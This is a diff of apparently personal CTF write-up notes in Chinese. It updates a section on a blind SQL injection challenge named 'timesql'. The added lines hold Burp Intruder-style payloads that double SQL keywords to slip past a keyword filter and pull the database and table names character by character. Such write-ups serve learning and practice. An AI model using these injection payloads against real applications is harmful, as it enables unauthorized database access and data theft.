@@ -1015,8 +1015,8 @@ gobuster进行目录扫描：
 扫到一个/bin目录，访问，拿到所需的BrainPan.exe：
 ![[Pasted image 20240311122616.png]]
 [嘤嘤嘤]timesql #SQL注入漏洞 时间/盲注
-题名写了timesql但是测试直接异或盲注他回显不一致，就用
-爆数据库名
+题名写了timesql但是测试直接异或盲注他回显不一致，就用异或盲注，服务器太烂了，用时间盲注时间一大一小看不清结果
+爆数据库名 为hazel
 ```
 username=admin'%20anandd%20subsubstrstr(database()%2c§1§%2c1)%3d'§2§'%20%23&password=114514
 ```
@@ -1028,6 +1028,7 @@ username=admin'%20anandd%20length((selselectect%20table_name%20frfromom%20infoor
 ![[Pasted image 20240328190530.png]]
 爆表名 为 users
 ```
-username=114514' oorr iiff(subsubstrstr((selselectect group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema='hazel'),§1§,1)='§z§',slesleepep(5),3)--+&password=114514
+username=admin'%20anandd%20subsubstrstr((selselectect%20table_name%20frfromom%20infoorrmation_schema.tables%20whwhereere%20table_schema%3ddatabase())%2c§1§%2c1)%20%3d%20'§a§'%20%23
 ```
-![[Pasted image 20240327164825.png]]
+![[Pasted image 20240328191209.png]]
+爆字段名 为
